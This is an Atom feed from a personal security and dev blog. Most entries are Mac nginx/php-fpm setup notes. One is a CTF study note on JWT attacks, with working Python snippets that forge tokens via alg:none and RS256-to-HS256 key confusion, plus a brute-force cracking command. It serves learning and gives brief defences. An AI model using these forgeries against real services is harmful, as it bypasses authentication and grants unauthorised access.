<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xianyu123&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://xianyu123.me/"/>
  <updated>2019-07-09T11:58:55.325Z</updated>
  <id>https://xianyu123.me/</id>
  
  <author>
    <name>xianyu123</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hash扩展攻击</title>
    <link href="https://xianyu123.me/2019/07/09/hash%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>https://xianyu123.me/2019/07/09/hash扩展攻击/</id>
    <published>2019-07-09T07:50:59.000Z</published>
    <updated>2019-07-09T11:58:55.325Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JWT(JSON Web Token) 攻击</title>
    <link href="https://xianyu123.me/2019/07/09/JWT-JSON-Web-Token-%E6%94%BB%E5%87%BB/"/>
    <id>https://xianyu123.me/2019/07/09/JWT-JSON-Web-Token-攻击/</id>
    <published>2019-07-09T04:26:13.000Z</published>
    <updated>2019-07-09T11:22:45.464Z</updated>
    
    <content type="html"><![CDATA[<p>最近这次国赛遇到了json web token的题目，发现并不能很顺利的做出来，于是写下这篇学习笔记</p><a id="more"></a><h1 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h1><p>JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们使用JWT在两个组织之间传递安全可靠的信息。</p><p>现在网上大多数介绍JWT的文章实际介绍的都是JWS(JSON Web Signature),也往往导致了人们对于JWT的误解，但是JWT并不等于JWS，JWS只是JWT的一种实现，除了JWS外，JWE(JSON Web Encryption)也是JWT的一种实现。</p><h1 id="JWT的组成"><a href="#JWT的组成" class="headerlink" title="JWT的组成"></a>JWT的组成</h1><p>我们随便来看一个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJoZWxsbyIsImlhdCI6MTU2MjUwNDkxOCwiZXhwIjoxNTYyNTA0OTIzLCJhY2NvdW50Ijoia2sifQ.GqWnsUjzpqtE4GJrZ5Zim_nrwnQTGAlidoGqe3354yM</span><br></pre></td></tr></table></figure><p>JWT的格式非常简单</p><p>JWT的数据分为三个部分： <code>headers</code> , <code>payloads</code>，<code>signature(签名)</code></p><p>三者通过<code>.</code>分割，均采用<code>base64编码</code></p><h2 id="Headers"><a href="#Headers" class="headerlink" title="Headers"></a>Headers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br><span class="line"></span><br><span class="line">解码后为：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alg为算法的缩写，typ为类型的缩写，有时候还会有kid，kid表示算法所使用的密钥文件（当服务端需要多个密钥文件时使用）</p><h2 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eyJpc3MiOiJoZWxsbyIsImlhdCI6MTU2MjUwNDkxOCwiZXhwIjoxNTYyNTA0OTIzLCJhY2NvdW50Ijoia2sifQ</span><br><span class="line"></span><br><span class="line">解码后为：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;iss&quot;: &quot;hello&quot;,</span><br><span class="line">  &quot;iat&quot;: 1562504918,</span><br><span class="line">  &quot;exp&quot;: 1562504923,</span><br><span class="line">  &quot;account&quot;: &quot;kk&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几个字段的含义如下，其中需要注意的字段是exp，这字段可在一定程度上被用来防止重放攻击</p><p>iss(issuer)：发布者的url地址</p><p>sub(subject)：该JWT所面向的用户，用于处理特定应用，不是常用的字段</p><p>aud(audience)：接受者的url地址</p><p>exp(expiration)：该jwt销毁的时间；unix时间戳</p><p>nbf(not before)：该jwt的使用时间不能早于该时间；unix时间戳</p><p>iat(issued at)：该jwt的发布时间；unix 时间戳</p><p>jti(JWT ID)：该jwt的唯一ID编号</p><h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GqWnsUjzpqtE4GJrZ5Zim_nrwnQTGAlidoGqe3354yM</span><br></pre></td></tr></table></figure><p>因为header和payload是明文存储的，所以签名是为了防止数据被修改的，提供了对数据的交易功能<br>签名常使用RS256(RSA 非对称加密，使用私钥签名)、HS256(HMAC SHA256 对称加密)算法，签名对象为base64encode(headers) + ‘.’ + base64encode(payloads)</p><h1 id="攻击JWT"><a href="#攻击JWT" class="headerlink" title="攻击JWT"></a>攻击JWT</h1><h2 id="1-敏感信息泄露"><a href="#1-敏感信息泄露" class="headerlink" title="1. 敏感信息泄露"></a>1. 敏感信息泄露</h2><p>很明显的一点，因为payload是明文传输的，所以如果payload中存在敏感信息就会出现信息泄露。当服务端的秘钥泄密的时候，JWT的伪造就变得非常简单容易。对此，服务端应该妥善保管好私钥，以免被他人窃取。</p><h2 id="2-修改算法为none"><a href="#2-修改算法为none" class="headerlink" title="2. 修改算法为none"></a>2. 修改算法为none</h2><p>签名算法保证了JWT在传输的过程中不被恶意用户修改</p><p>但是header中的alg字段可被修改为none</p><p>一些JWT库支持none算法，即没有签名算法，当alg为none时后端不会进行签名校验</p><p>将alg修改为none后，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’）然后提交到服务端即可</p><p>这种攻击的例子可以参考：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p><p>代码可以在Github上找到 <a href="https://github.com/Sjord/jwtdemo/" target="_blank" rel="noopener">https://github.com/Sjord/jwtdemo/</a></p><p>这个例子的解法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原headers:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span></span><br><span class="line"><span class="comment"># 解码后:&#123;"typ": "JWT","alg": "HS256"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原payloads：eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjY2MjkyNSwiZXhwIjoxNTYyNjYzMDQ1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># 解码后:&#123; "iss": "http://demo.sjoerdlangkemper.nl/", "iat": 1562662925,"exp": 1562663045,"data": &#123;"hello": "world"&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新构造新的</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">headers = <span class="string">"&#123;\"typ\":\"JWT\",\"alg\":\"none\"&#125;"</span></span><br><span class="line">payloads = <span class="string">"&#123;\"data\":\"test\"&#125;"</span></span><br><span class="line">bytesHeaders = headers.encode(encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">encodeHead = base64.b64encode(bytesHeaders)</span><br><span class="line">bytesPay = payloads.encode(encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">encodePay = base64.b64encode(bytesPay)</span><br><span class="line">print( encodeHead.decode()+ <span class="string">'.'</span> +encodePay.decode() + <span class="string">'.'</span>)</span><br></pre></td></tr></table></figure><p>如何把得出的值传入到可控的参数中，可以看到<code>alg</code>已经被我们修改成了<code>none</code></p><p><img src="http://images.xianyu123.club/JWT1.png" alt></p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li><p>不允许出现 none 的方法；</p></li><li><p>将开启 alg : none 作为一种额外的配置选项。</p></li></ol><h2 id="3-将算法RS256修改为HS256（非对称密码算法-gt-对称密码算法）"><a href="#3-将算法RS256修改为HS256（非对称密码算法-gt-对称密码算法）" class="headerlink" title="3. 将算法RS256修改为HS256（非对称密码算法=&gt;对称密码算法）"></a>3. 将算法RS256修改为HS256（非对称密码算法=&gt;对称密码算法）</h2><p>算法HS256使用秘密密钥对每条消息进行签名和验证。</p><p>算法RS256使用私钥对消息进行签名，并使用公钥进行验证。</p><p>如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。</p><p>由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。</p><p>后端代码会使用RSA公钥+HS256算法进行签名验证。</p><p>同样的，可以通过一个例子来理解这种攻击方式 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a></p><p>RSA公钥：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a></p><p>这个例子的解法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原headers:eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9</span></span><br><span class="line"><span class="comment"># 解码后:&#123;"typ": "JWT", "alg": "RS256"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原payloads：eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU2MjY2NzkwMSwiZXhwIjoxNTYyNjY4MDIxLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># 解码后:&#123;"iss": "http://demo.sjoerdlangkemper.nl/","iat": 1562667901,"exp": 1562668021,"data": &#123;"hello": "world"&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新构造：</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment"># public.pem从上面的公钥地址下载，一般ctf比赛中都会有公钥泄漏可以下载的</span></span><br><span class="line">public = open(<span class="string">'public.pem'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"data"</span>:<span class="string">"test"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>))</span><br></pre></td></tr></table></figure><p>如果遇到报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</span><br></pre></td></tr></table></figure><p>解决如下：</p><p><code>pip3 install pyjwt==0.4.3</code></p><p>如何把得出的值传入到可控的参数中，可以看到我们绕过了<code>RS256</code>算法，把它变成了<code>HS256</code>算法，且数据可控</p><p><img src="http://images.xianyu123.club/JWT2.png" alt></p><h2 id="4-HS256（对称加密）密钥破解"><a href="#4-HS256（对称加密）密钥破解" class="headerlink" title="4. HS256（对称加密）密钥破解"></a>4. HS256（对称加密）密钥破解</h2><p>如果HS256密钥强度较弱，则可以直接强制使用，通过爆破 HS256的秘钥可以完成该操作。难度比较低。</p><p>破解工具<a href="https://github.com/brendan-rius/c-jwt-cracker*" target="_blank" rel="noopener">c-jwt-cracker</a></p><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJMM3l4IiwiaWF0IjoxNTYyNTA0OTE4LCJleHAiOjE1NjI1MDQ5MjMsImFjY291bnQiOiJrayJ9.CJcfvv6JbajrhNriA2-Hb_2yYCUy5aeAvUjVzdgBytw</span><br></pre></td></tr></table></figure><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>使用复杂的秘钥即可</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://www.jianshu.com/p/50ade6f2e4fd" target="_blank" rel="noopener">一篇文章带你分清楚JWT,JWS与JWE</a></li><li><p><a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">Json Web Token历险记</a></p></li><li><p><a href="https://www.cnblogs.com/dliv3/p/7450057.html" target="_blank" rel="noopener">Hacking JWT(JSON Web Token)</a></p></li><li><p><a href="https://xz.aliyun.com/t/2338" target="_blank" rel="noopener">JSON Web Token (JWT) 攻击技巧</a></p></li><li><a href="https://www.freebuf.com/articles/web/180874.html" target="_blank" rel="noopener">深入了解Json Web Token之概念篇</a></li><li><a href="https://www.freebuf.com/articles/web/181261.html" target="_blank" rel="noopener">深入了解Json Web Token之实战篇</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近这次国赛遇到了json web token的题目，发现并不能很顺利的做出来，于是写下这篇学习笔记&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="https://xianyu123.me/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>mac下安装多版本php和配置php-fpm的一些坑</title>
    <link href="https://xianyu123.me/2019/05/28/mac%E4%B8%8B%E5%AE%89%E8%A3%85%E5%A4%9A%E7%89%88%E6%9C%ACphp%E5%92%8C%E9%85%8D%E7%BD%AEphp-fpm%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
    <id>https://xianyu123.me/2019/05/28/mac下安装多版本php和配置php-fpm的一些坑/</id>
    <published>2019-05-28T11:01:50.000Z</published>
    <updated>2019-05-28T13:06:17.788Z</updated>
    
    <content type="html"><![CDATA[<p>mac下安装多版本php和配置php-fpm的一些坑</p><a id="more"></a><h2 id="phpbrew的安装"><a href="#phpbrew的安装" class="headerlink" title="phpbrew的安装"></a>phpbrew的安装</h2><p>请参考<a href="https://github.com/phpbrew/phpbrew/blob/master/README.cn.md" target="_blank" rel="noopener">phpbrew的安装</a></p><h2 id="php-v和（php-fpm或-phpinfo-）版本不一样"><a href="#php-v和（php-fpm或-phpinfo-）版本不一样" class="headerlink" title="php -v和（php-fpm或 phpinfo()）版本不一样"></a>php -v和（php-fpm或 phpinfo()）版本不一样</h2><p>用<code>phpbrew</code>安装<code>php5.6.30</code>，然后用<code>phpbrew switch php-5.6.30</code>切换成<code>5.6.30</code></p><p>在终端下使用<code>php -v</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP 5.6.30 (cli) (built: May 14 2019 18:30:16)</span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br></pre></td></tr></table></figure><p>在终端下使用<code>php-fpm -v</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP 7.1.16 (fpm-fcgi) (built: Mar 31 2018 03:00:16)</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies</span><br></pre></td></tr></table></figure><p>在web端如下</p><p><img src="http://images.xianyu123.club/php-fpm_problem.png" alt></p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><h4 id="添加php-fpm软链"><a href="#添加php-fpm软链" class="headerlink" title="添加php-fpm软链"></a>添加php-fpm软链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /Users/kb/.phpbrew/php/php-5.6.30/sbin/php-fpm /usr/sbin/php-fpm</span><br></pre></td></tr></table></figure><p>如果<code>/usr/sbin</code>下存在<code>php-fpm</code>，就先把原来的删除</p><p>创建软连接以后，关闭终端，重新进入，分别运行<code>php -v</code>和<code>php-fpm -v</code>看下版本是否一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php -v</span><br><span class="line">PHP 5.6.30 (cli) (built: May 28 2019 16:01:05)</span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br><span class="line"></span><br><span class="line">php-fpm -v</span><br><span class="line">PHP 5.6.30 (fpm-fcgi) (built: May 28 2019 16:01:14)</span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br></pre></td></tr></table></figure><p>配置完上面后，在web页面打开会遇到访问php页面404的问题</p><h2 id="解决nginx访问php页面404问题"><a href="#解决nginx访问php页面404问题" class="headerlink" title="解决nginx访问php页面404问题"></a>解决nginx访问php页面404问题</h2><p>查看<code>php5.6.30 sock</code>的绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./.phpbrew/php/php-5.6.30/etc/php-fpm.conf | grep &quot;listen = /&quot;</span><br></pre></td></tr></table></figure><p>然后把这个路径添加到nginx 的配置文件中，nginx 的配置文件在<code>/usr/local/etc/nginx/nginx.conf</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">  <span class="attribute">root</span>           html;</span><br><span class="line">  <span class="attribute">fastcgi_pass</span>   unix:路径地址;</span><br><span class="line">  <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">  <span class="attribute">include</span>        fastcgi.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解决Permission-denied-while-connecting-to-upstream问题"><a href="#解决Permission-denied-while-connecting-to-upstream问题" class="headerlink" title="解决Permission denied while connecting to upstream问题"></a>解决Permission denied while connecting to upstream问题</h2><p>过程中碰到<code>[crit] 2963#0: *138 connect() to unix:/tmp/php5-fpm.sock failed (13: Permission denied) while connecting to upstream</code>的问题, 这是由于没有指定nginx的用户, nginx的用户没有权限访问fpm造成的<br>在<code>/Users/kb/.phpbrew/php/php-5.6.30/etc/php-fpm.conf</code>中找到<code>listen</code>行, 在后面添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listen.owner = nobody</span><br><span class="line">listen.group = nobody</span><br></pre></td></tr></table></figure><p>并且在<code>/usr/local/etc/nginx/nginx.conf</code>中找到<code>user</code>行, 默认的是被注释掉的, 取消注释, 这时的用户是nobody, 重启nginx和fpm, 问题得到解决</p><p>然后就可以愉快地使用php+nginx 5.6版本了</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.leavesongs.com/PHP/php7-nginx-mysql-install-note.html" target="_blank" rel="noopener">php7 + nginx + mysql 安装小计</a></p><p><a href="https://juejin.im/post/5c8fb28a6fb9a07103548318" target="_blank" rel="noopener">笔记：MAC使用brew配置nginx、php、mysql、php-fpm、redis</a></p><p><a href="https://www.cnblogs.com/mrzero/p/4295536.html" target="_blank" rel="noopener">Mac OS下配置PHP Nginx PHP-FPM</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mac下安装多版本php和配置php-fpm的一些坑&lt;/p&gt;
    
    </summary>
    
      <category term="Mac" scheme="https://xianyu123.me/categories/Mac/"/>
    
    
  </entry>
  
  <entry>
    <title>mac下搭建nginx+php-fpm</title>
    <link href="https://xianyu123.me/2019/05/13/mac%E4%B8%8B%E6%90%AD%E5%BB%BAnginx-php-fpm/"/>
    <id>https://xianyu123.me/2019/05/13/mac下搭建nginx-php-fpm/</id>
    <published>2019-05-13T06:31:20.000Z</published>
    <updated>2019-05-28T11:12:36.738Z</updated>
    
    <content type="html"><![CDATA[<p>mac下搭建nginx+php-fpm的笔记</p><a id="more"></a><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><p>如果没有安装过brew，请参考<a href="https://www.jianshu.com/p/ab50ea8b13d6" target="_blank" rel="noopener">Mac OS下brew的安装和使用</a></p><h3 id="1-停止本地Apache服务"><a href="#1-停止本地Apache服务" class="headerlink" title="1. 停止本地Apache服务"></a>1. 停止本地Apache服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apachectl stop</span><br></pre></td></tr></table></figure><h3 id="2-安装nginx"><a href="#2-安装nginx" class="headerlink" title="2. 安装nginx"></a>2. 安装nginx</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install nginx</span><br></pre></td></tr></table></figure><h3 id="3-启动nginx"><a href="#3-启动nginx" class="headerlink" title="3. 启动nginx"></a>3. 启动nginx</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><h3 id="4-访问nginx"><a href="#4-访问nginx" class="headerlink" title="4. 访问nginx"></a>4. 访问nginx</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">打开浏览器,输入如下网址,正确的情况就可以看到如下的截图.</span><br><span class="line">http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/nginx_mac.png" alt></p><h3 id="5-文件说明"><a href="#5-文件说明" class="headerlink" title="5. 文件说明"></a>5. 文件说明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">通过上面的步骤,就表示nginx已经完成了.这里有几个文件,我们需要关注一下.</span><br><span class="line"></span><br><span class="line">/usr/local/etc/nginx/nginx.conf （配置文件路径）</span><br><span class="line"></span><br><span class="line">/usr/local/var/www （服务器默认路径）</span><br><span class="line"></span><br><span class="line">/usr/local/Cellar/nginx/1.8.0 （安装路径)</span><br></pre></td></tr></table></figure><h3 id="6-配置php"><a href="#6-配置php" class="headerlink" title="6.  配置php"></a>6.  配置php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.去掉nginx.conf中如下代码中的注释(在去掉之前最好备份一份 cp nginx.conf nginx.conf.bak)</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">&#125;</span><br><span class="line">该段代码的主要意思就是让nginx能够解析到php,不然你去访问php的文件,nginx会默认下载该php文件</span><br><span class="line"></span><br><span class="line">2.修改1中的部分配置</span><br><span class="line">原配置中的值为/scripts$fastcgi_script_name, 需要修改为$document_root$fastcgi_script_name</span><br><span class="line">该代码主要的意思就是让nginx能够识别到nginx配置文件中的root项.不然会报not find file错误信息.</span><br><span class="line"></span><br><span class="line">3.然后重启nginx服务</span><br><span class="line">nginx -s reload</span><br><span class="line"></span><br><span class="line">4.配置php-fpm文件</span><br><span class="line">sudo cp /private/etc/php-fpm.conf.default /private/etc/php-fpm.conf</span><br><span class="line">修改我们新复制的php-fpm.conf文件中的如下配置项目.修改为下面的示例,记得把前面的分号去掉，默认是注释的</span><br><span class="line">pid=/usr/local/var/run/php-fpm.pid</span><br><span class="line">error_log=/usr/local/var/log/php-fpm.log</span><br><span class="line"></span><br><span class="line">5.启动php-fpm服务</span><br><span class="line">sudo php-fpm</span><br></pre></td></tr></table></figure><p>启动服务的时候可能会遇到下面的问题,反正我是遇到了(下面的路径根据你图片指示的路径来定,可能有的环境路径不一致).解决办法是</p><p><img src="http://images.xianyu123.club/nginx_mac_error.jpeg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /data/server/php7/etc/php-fpm.d/www.conf.default /data/server/php7/etc/php-fpm.d/www.conf</span><br></pre></td></tr></table></figure><p>然后在启动一次,即可</p><p>在修改服务器默认路径需要用绝对路径，不能用<code>～</code>的相对路径</p><h3 id="7-测试"><a href="#7-测试" class="headerlink" title="7. 测试"></a>7. 测试</h3><p>在服务器目录下新建一个php文件，内容为<code>&lt;?php phpinfo(); ?&gt;</code>，访问这个文件，如果出现的是<code>phpinfo</code>的页面代表成功了</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://www.imooc.com/article/283670" target="_blank" rel="noopener">Mac系统下搭建Nginx+php-fpm</a></p><p><a href="https://blog.csdn.net/zhengwish/article/details/79380088" target="_blank" rel="noopener">ERROR: failed to open error_log (/usr/var/log/php-fpm.log)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mac下搭建nginx+php-fpm的笔记&lt;/p&gt;
    
    </summary>
    
      <category term="Mac" scheme="https://xianyu123.me/categories/Mac/"/>
    
    
  </entry>
  
  <entry>
    <title>换电脑后如何迁移hexo博客</title>
    <link href="https://xianyu123.me/2019/05/11/%E6%8D%A2%E7%94%B5%E8%84%91%E5%90%8E%E5%A6%82%E4%BD%95%E8%BF%81%E7%A7%BBhexo%E5%8D%9A%E5%AE%A2/"/>
    <id>https://xianyu123.me/2019/05/11/换电脑后如何迁移hexo博客/</id>
    <published>2019-05-11T13:46:05.000Z</published>
    <updated>2019-05-11T14:07:06.114Z</updated>
    
    <content type="html"><![CDATA[<p>网上也有类似的教程，但是每次都要去上网查询怎么去配置，比较耗时。所以就自己记录下来，方便以后看。</p><a id="more"></a><h2 id="开始前准备"><a href="#开始前准备" class="headerlink" title="开始前准备"></a>开始前准备</h2><p>本博文默认<code>git</code>,<code>nodejs</code>已经安装好</p><h2 id="分析文件"><a href="#分析文件" class="headerlink" title="分析文件"></a>分析文件</h2><h3 id="1-哪些文件是必须拷贝走的-拷贝到新的电脑"><a href="#1-哪些文件是必须拷贝走的-拷贝到新的电脑" class="headerlink" title="1.哪些文件是必须拷贝走的(拷贝到新的电脑)"></a>1.哪些文件是必须拷贝走的(拷贝到新的电脑)</h3><p>首先是之前自己修改的文件，像配置文件<code>_config.yml</code>,<code>theme</code>文件夹，<code>source</code>文件夹自己写的原始文件这些都是必须要拷贝走的。除此之外还有<code>scaffolds</code>文件夹(文件的模板)，<code>package.json</code>(使用哪些包)，<code>.gitignore</code>(提交忽略哪些文件夹)<br>总结：</p><ul><li><code>_config.yml</code></li><li><code>theme</code></li><li><code>source</code></li><li><code>scaffolds</code></li><li><code>package.json</code></li><li><code>.gitignore</code></li></ul><p><strong>这些是需要拷贝的</strong></p><h3 id="2-哪些文件是需要忽略不用管的"><a href="#2-哪些文件是需要忽略不用管的" class="headerlink" title="2.哪些文件是需要忽略不用管的"></a>2.哪些文件是需要忽略不用管的</h3><ul><li><p><code>.git</code></p></li><li><p><code>node_mouldes/</code> </p></li><li><p><code>public/</code> </p></li><li><p><code>.deploy_git/</code> </p></li><li><p><code>db.json</code></p></li></ul><h2 id="开始迁移"><a href="#开始迁移" class="headerlink" title="开始迁移"></a>开始迁移</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 